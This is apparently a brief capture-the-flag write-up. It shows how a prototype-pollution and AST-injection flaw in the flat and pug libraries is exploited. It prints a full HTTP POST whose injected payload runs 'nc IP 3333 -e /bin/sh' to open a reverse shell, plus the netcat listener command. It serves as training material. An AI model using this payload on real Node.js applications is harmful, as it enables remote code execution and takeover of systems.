Looking through the source code given to us, I noticed we're using a specific version of `flat` and `pug`.

Searching up vulnerabilities to these versions lead me to this url: `https://blog.p6.is/AST-Injection/#Pug`.

I've never delt with AST before so this is all new to me. However it provided code that we can modify and execute. Using Burp I crafted this POST:

```
POST /api/submit HTTP/1.1
Host: 178.62.18.46:31960
Content-Length: 31
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://178.62.18.46:31960
Referer: http://178.62.18.46:31960/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{
    "artist.name":"Alex Westaway",
    "__proto__.block": {
            "type": "Text", 
            "line": "process.mainModule.require('child_process').execSync(`nc IP 3333 -e /bin/sh`)"
    }
}
```

This gives us RCE. Running a netcat listener with `nc -nlvp 3333` allows us to execute this code and give us reverse shell